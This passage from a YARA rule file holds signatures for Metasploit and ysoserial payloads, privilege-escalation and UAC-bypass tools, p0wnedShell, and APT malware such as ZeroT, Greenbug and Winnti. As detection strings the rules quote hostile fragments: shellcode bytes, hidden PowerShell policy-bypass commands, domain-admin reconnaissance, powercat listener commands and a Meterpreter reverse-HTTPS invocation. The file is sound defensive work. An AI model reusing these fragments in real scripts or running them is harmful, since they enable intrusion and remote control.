      description = "Metasploit Payloads - file msf.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:54:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "1.7"
      
   strings:
      $s1 = { 0c 8b 52 14 8b 72 28 0f b7 4a 26 31 ff ac 3c 61 } 
      $s2 = { 01 c7 38 e0 75 f6 03 7d f8 3b 7d 24 75 e4 58 8b } 
      $s3 = { 01 d0 89 44 24 24 5b 5b 61 59 5a 51 ff e0 5f 5f } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule Msfpayloads_msf_11_RID2DFA : APT DEMO T1136 {
   meta:
      description = "Metasploit Payloads - file msf.hta"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 10:54:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") Then" fullword ascii
      $s2 = "= CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s3 = "= CreateObject(\"Wscript.Shell\") " fullword ascii
   condition: 
      all of them
} 

rule Msfpayloads_msf_ref_RID2ED5 : APT DEMO T1086 T1136 {
   meta:
      description = "Metasploit Payloads - file msf-ref.ps1"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-02-09 11:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "kernel32.dll WaitForSingleObject)," ascii
      $s2 = "= ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')" ascii
      $s3 = "GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object" ascii
      $s4 = ".DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual'," ascii
      $s5 = "= [System.Convert]::FromBase64String(" ascii
      $s6 = "[Parameter(Position = 0, Mandatory = $True)] [Type[]]" fullword ascii
      $s7 = "DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard," ascii
   condition: 
      5 of them
} 

rule RottenPotato_Potato_RID2EDA : DEMO EXE FILE HKTL T1053 T1068 T1134 T1136 {
   meta:
      description = "Detects a component of privilege escalation tool Rotten Potato - file Potato.exe"
      author = "Florian Roth"
      reference = "https://github.com/foxglovesec/RottenPotato"
      date = "2017-02-07 11:32:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1053, T1068, T1134, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Potato.exe -ip <ip>" fullword wide
      $x2 = "-enable_httpserver true -enable_spoof true" fullword wide
      $x3 = "/C schtasks.exe /Create /TN omg /TR" fullword wide
      $x4 = "-enable_token true -enable_dce true" fullword wide
      $x5 = "DNS lookup succeeds - UDP Exhaustion failed!" fullword wide
      $x6 = "DNS lookup fails - UDP Exhaustion worked!" fullword wide
      $x7 = "\\obj\\Release\\Potato.pdb" fullword ascii
      $x8 = "function FindProxyForURL(url,host){if (dnsDomainIs(host, \"localhost\")) return \"DIRECT\";" fullword wide
      $s1 = "\"C:\\Windows\\System32\\cmd.exe\" /K start" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) ) or ( 2 of them )
} 

rule Ysoserial_Payload_C3P0_RID2F4A : DEMO EXPLOIT FILE T1136 T1193 T1203 {
   meta:
      description = "Ysoserial Payloads - file C3P0.bin"
      author = "Florian Roth"
      reference = "https://github.com/frohoff/ysoserial"
      date = "2017-02-04 11:50:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "exploitppppw" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xedac and filesize < 3KB and all of them )
} 

rule Ysoserial_Payload_Spring1_RID30F8 : DEMO EXPLOIT T1136 T1193 T1203 {
   meta:
      description = "Ysoserial Payloads - file Spring1.bin"
      author = "Florian Roth"
      reference = "https://github.com/frohoff/ysoserial"
      date = "2017-02-04 13:02:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ysoserial/Pwner" ascii
   condition: 
      1 of them
} 

rule CN_APT_ZeroT_nflogger_RID2EEC : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Chinese APT by Proofpoint ZeroT RAT  - file nflogger.dll"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-04 11:35:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\LoaderDll.VS2010\\Release\\" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
} 

rule CN_APT_ZeroT_extracted_Go_RID3071 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Chinese APT by Proofpoint ZeroT RAT  - file Go.exe"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-04 12:40:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s\\cmd.exe /c %s\\Zlh.exe" fullword ascii
      $x2 = "\\BypassUAC.VS2010\\Release\\" fullword ascii
      $s1 = "Zjdsf.exe" fullword ascii
      $s2 = "SS32prep.exe" fullword ascii
      $s3 = "windowsgrep.exe" fullword ascii
      $s4 = "Sysdug.exe" fullword ascii
      $s5 = "Proessz.exe" fullword ascii
      $s6 = "%s\\Zlh.exe" fullword ascii
      $s7 = "/C %s\\%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 7 of them )
} 

rule CN_APT_ZeroT_extracted_Mcutil_RID3229 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Chinese APT by Proofpoint ZeroT RAT  - file Mcutil.dll"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-04 13:53:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LoaderDll.dll" fullword ascii
      $s2 = "QageBox1USER" fullword ascii
      $s3 = "xhmowl" fullword ascii
      $s4 = "?KEYKY" fullword ascii
      $s5 = "HH:mm:_s" fullword ascii
      $s6 = "=licni] has maX0t" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 90KB and 3 of them ) or ( all of them )
} 

rule Ysoserial_Payload_MozillaRhino1_RID335D : DEMO EXPLOIT FILE T1136 T1193 T1203 {
   meta:
      description = "Ysoserial Payloads - file MozillaRhino1.bin"
      author = "Florian Roth"
      reference = "https://github.com/frohoff/ysoserial"
      date = "2017-02-04 14:44:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "ysoserial.payloads" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xedac and filesize < 40KB and all of them )
} 

rule Ysoserial_Payload_RID2DF5 : DEMO EXPLOIT FILE T1136 T1193 T1203 {
   meta:
      description = "Ysoserial Payloads"
      author = "Florian Roth"
      reference = "https://github.com/frohoff/ysoserial"
      date = "2017-02-04 10:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ysoserial/payloads/" ascii
      $s1 = "StubTransletPayload" fullword ascii
      $s2 = "Pwnrpw" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xedac and filesize < 40KB and $x1 ) or ( all of them )
} 

rule Ysoserial_Payload_3_RID2E87 : DEMO EXPLOIT FILE T1136 T1193 T1203 {
   meta:
      description = "Ysoserial Payloads - from files JavassistWeld1.bin, JBossInterceptors.bin"
      author = "Florian Roth"
      reference = "https://github.com/frohoff/ysoserial"
      date = "2017-02-04 11:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXPLOIT, FILE, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ysoserialq" fullword ascii
      $s1 = "targetClassInterceptorMetadatat" fullword ascii
      $s2 = "targetInstancet" fullword ascii
      $s3 = "targetClassL" fullword ascii
      $s4 = "POST_ACTIVATEsr" fullword ascii
      $s5 = "PRE_DESTROYsq" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0xedac and filesize < 10KB and $x1 ) or ( all of them )
} 

rule PP_CN_APT_ZeroT_1_RID2CC8 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "suprise.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule PP_CN_APT_ZeroT_2_RID2CC9 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:04:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "NO2-2016101902.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule PP_CN_APT_ZeroT_3_RID2CCA : APT CHINA DEMO FILE T1136 T1223 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:04:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, FILE, T1136, T1223"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/svchost.exe" fullword ascii
      $s2 = "RasTls.dll" fullword ascii
      $s3 = "20160620.htm" fullword ascii
      $s4 = "* $l&$" fullword ascii
      $s5 = "dfjhmh" fullword ascii
      $s6 = "/20160620.htm" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 3 of them ) or ( all of them )
} 

rule PP_CN_APT_ZeroT_4_RID2CCB : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:04:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Mcutil.dll" fullword ascii
      $s2 = "mcut.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule PP_CN_APT_ZeroT_5_RID2CCC : APT CHINA DEMO FILE T1136 T1223 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:04:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, FILE, T1136, T1223"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "dbozcb" fullword ascii
      $s1 = "nflogger.dll" fullword ascii
      $s2 = "/svchost.exe" fullword ascii
      $s3 = "1207.htm" fullword ascii
      $s4 = "/1207.htm" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 1 of ( $x* ) and 1 of ( $s* ) ) or ( all of them )
} 

rule PP_CN_APT_ZeroT_7_RID2CCE : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:04:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "RasTls.dll" fullword ascii
      $s2 = "RasTls.exe" fullword ascii
      $s4 = "LOADER ERROR" fullword ascii
      $s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule PP_CN_APT_ZeroT_8_RID2CCF : APT CHINA DEMO FILE T1136 T1223 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:05:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, FILE, T1136, T1223"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/svchost.exe" fullword ascii
      $s2 = "RasTls.dll" fullword ascii
      $s3 = "20160620.htm" fullword ascii
      $s4 = "/20160620.htm" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 3 of them )
} 

rule PP_CN_APT_ZeroT_9_RID2CD0 : APT CHINA DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from the Proofpoint CN APT ZeroT incident"
      author = "Florian Roth"
      reference = "https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx"
      date = "2017-02-03 10:05:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "nflogger.dll" fullword ascii
      $s7 = "Zlh.exe" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
} 

rule UACME_Akagi_2_RID2B49 : DEMO EXE FILE HKTL T1088 T1136 T1183 {
   meta:
      description = "Detects Windows User Account Control Bypass - from files Akagi32.exe, Akagi64.exe"
      author = "Florian Roth"
      reference = "https://github.com/hfiref0x/UACME"
      date = "2017-02-03 09:00:01"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1088, T1136, T1183"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: Akagi.exe [Method] [OptionalParamToExecute]" fullword wide
      $x2 = "[UCM] Target file already exists, abort" fullword wide
      $s1 = "MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" fullword wide
      $s2 = "Akagi.exe" fullword wide
      $s3 = "Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}" fullword wide
      $s4 = "/c wusa %ws /extract:%%windir%%\\system32\\sysprep" fullword wide
      $s5 = "/c wusa %ws /extract:%%windir%%\\system32\\migwiz" fullword wide
      $s6 = "loadFrom=\"%systemroot%\\system32\\sysprep\\cryptbase.DLL\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 6 of them )
} 

rule GoogleBot_UserAgent_RID2E80 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects the GoogleBot UserAgent String in an Executable"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-01-27 11:17:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii
      $fp1 = "McAfee, Inc." wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 and not 1 of ( $fp* ) )
} 

rule Greenbug_Malware_1_RID2DF8 : DEMO EXE FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Malware from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25 10:54:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "vailablez" fullword ascii
      $s2 = "Sfouglr" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )
} 

rule Greenbug_Malware_3_RID2DFA : DEMO MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects Backdoor from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25 10:54:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "F:\\Projects\\Bot\\Bot\\Release\\Ism.pdb" fullword ascii
      $x2 = "C:\\ddd\\wer2.txt" fullword wide
      $x3 = "\\Microsoft\\Windows\\tmp43hh11.txt" fullword wide
   condition: 
      1 of them
} 

rule Winnti_fonfig_RID2C62 : CHINA DEMO EXE FILE G0044 MAL T1136 {
   meta:
      description = "Winnti sample - file fonfig.exe"
      author = "Florian Roth"
      reference = "https://goo.gl/VbvJtL"
      date = "2017-01-25 09:46:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mciqtz.exe" fullword wide
      $s2 = "knat9y7m" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
} 

rule Greenbug_Malware_2_RID2DF9 : DEMO EXE FILE MAL MIDDLE_EAST T1047 T1136 {
   meta:
      description = "Detects Backdoor from Greenbug Incident"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25 10:54:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "|||Command executed successfully" fullword ascii
      $x2 = "\\Release\\Bot Fresh.pdb" ascii
      $x3 = "C:\\ddd\\a1.txt" fullword wide
      $x4 = "Bots\\Bot5\\x64\\Release" ascii
      $x5 = "Bot5\\Release\\Ism.pdb" ascii
      $x6 = "Bot\\Release\\Ism.pdb" ascii
      $x7 = "\\Bot Fresh\\Release\\Bot" ascii
      $s1 = "/Home/SaveFile?commandId=CmdResult=" fullword wide
      $s2 = "raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday" fullword ascii
      $s3 = "Set-Cookie:\\b*{.+?}\\n" fullword wide
      $s4 = "SELECT * FROM AntiVirusProduct" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 3 of them )
} 

rule Greenbug_Malware_4_RID2DFB : DEMO EXE FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects ISMDoor Backdoor"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25 10:55:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "powershell.exe -nologo -windowstyle hidden -c \"Set-ExecutionPolicy -scope currentuser" fullword ascii
      $s2 = "powershell.exe -c \"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \"" fullword ascii
      $s3 = "c:\\windows\\temp\\tmp8873" fullword ascii
      $s4 = "taskkill /im winit.exe /f" fullword ascii
      $s5 = "invoke-psuacme" 
      $s6 = "-method oobe -payload \"\"" fullword ascii
      $s7 = "C:\\ProgramData\\stat2.dat" fullword wide
      $s8 = "Invoke-bypassuac" fullword ascii
      $s9 = "Start Keylog Done" fullword wide
      $s10 = "Microsoft\\Windows\\WinIt.exe" fullword ascii
      $s11 = "Microsoft\\Windows\\Tmp9932u1.bat\"" fullword ascii
      $s12 = "Microsoft\\Windows\\tmp43hh11.txt" fullword wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them ) or ( 3 of them )
} 

rule Greenbug_Malware_5_RID2DFC : DEMO EXE FILE MAL MIDDLE_EAST T1047 T1087 T1136 {
   meta:
      description = "Detects Greenbug malware samples"
      author = "Florian Roth"
      reference = "https://goo.gl/urp4CD"
      date = "2017-01-25 10:55:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1047, T1087, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cmd /u /c WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter" fullword ascii
      $x2 = "cmd /a /c net user administrator /domain >>" fullword ascii
      $x3 = "cmd /a /c netstat -ant >>\"%localappdata%\\Microsoft\\" fullword ascii
      $o1 = "========================== (Net User) ==========================" ascii fullword
   condition: 
      filesize < 2000KB and ( ( uint16 ( 0 ) == 0x5a4d and 1 of them ) or $o1 )
} 

rule Winnti_NlaifSvc_RID2CFF : CHINA DEMO EXE FILE G0044 MAL T1136 {
   meta:
      description = "Winnti sample - file NlaifSvc.dll"
      author = "Florian Roth"
      reference = "https://goo.gl/VbvJtL"
      date = "2017-01-25 10:13:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, G0044, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cracked by ximo" ascii
      $s1 = "Yqrfpk" fullword ascii
      $s2 = "IVVTOC" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 3 of them )
} 

rule p0wnedPowerCat_RID2C84 : DEMO FILE HKTL T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat_RID2C84.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 09:52:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Now if we point Firefox to http://127.0.0.1" fullword ascii
      $x2 = "powercat -l -v -p" fullword ascii
      $x3 = "P0wnedListener" fullword ascii
      $x4 = "EncodedPayload.bat" fullword ascii
      $x5 = "powercat -c " fullword ascii
      $x6 = "Program.P0wnedPath()" ascii
      $x7 = "Invoke-PowerShellTcpOneLine" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7375 and filesize < 150KB and 1 of them ) or ( 2 of them )
} 

rule p0wnedPotato_RID2BD6 : DEMO HKTL T1068 T1134 T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPotato_RID2BD6.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 09:23:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1068, T1134, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invoke-Tater" fullword ascii
      $x2 = "P0wnedListener.Execute(WPAD_Proxy);" fullword ascii
      $x3 = " -SpooferIP " ascii
      $x4 = "TaterCommand()" ascii
      $x5 = "FileName = \"cmd.exe\"," fullword ascii
   condition: 
      1 of them
} 

rule p0wnedExploits_RID2CB7 : DEMO HKTL T1033 T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits_RID2CB7.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 10:01:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1033, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Pshell.RunPSCommand(Whoami);" fullword ascii
      $x2 = "If succeeded this exploit should popup a System CMD Shell" fullword ascii
   condition: 
      all of them
} 

rule p0wnedShellx64_RID2C39 : DEMO HKTL T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShellx64_RID2C39.exe"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 09:40:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9Pjgb/+kPPhv9Sjp01Wf" wide
      $x2 = "Invoke-TokenManipulation" wide
      $x3 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" fullword wide
      $x4 = "CommandShell with Local Administrator privileges :)" fullword wide
      $x5 = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " fullword wide
   condition: 
      1 of them
} 

rule p0wnedListenerConsole_RID2F78 : DEMO HKTL T1055 T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole_RID2F78.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 11:58:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1055, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Invoke_ReflectivePEInjection" fullword wide
      $x5 = "p0wnedShell> " fullword wide
      $x6 = "Resources.Get_PassHashes" fullword wide
      $s7 = "Invoke_CredentialsPhish" fullword wide
      $s8 = "Invoke_Shellcode" fullword wide
      $s9 = "Resources.Invoke_TokenManipulation" fullword wide
      $s10 = "Resources.Port_Scan" fullword wide
      $s20 = "Invoke_PowerUp" fullword wide
   condition: 
      1 of them
} 

rule p0wnedBinaries_RID2C8C : DEMO HKTL T1136 {
   meta:
      description = "p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries_RID2C8C.cs"
      author = "Florian Roth"
      reference = "https://github.com/Cn33liz/p0wnedShell"
      date = "2017-01-14 09:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9" ascii
